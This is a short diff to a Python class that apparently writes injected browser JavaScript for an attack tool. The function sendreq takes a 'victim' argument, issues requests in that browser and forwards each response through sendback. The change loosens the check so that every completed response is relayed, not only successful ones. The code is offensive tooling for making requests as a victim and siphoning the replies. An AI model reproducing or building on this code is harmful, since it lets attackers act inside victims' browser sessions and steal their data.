@@ -45,7 +45,7 @@ class writejs():
             function sendreq(method, site, victim, args, head){
                 var xhr = new XMLHttpRequest();
                 xhr.onreadystatechange = function() {
-                if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
+                if(xhr.readyState === XMLHttpRequest.DONE) {
                     sendback(site,xhr.responseText);
                     }
                 }
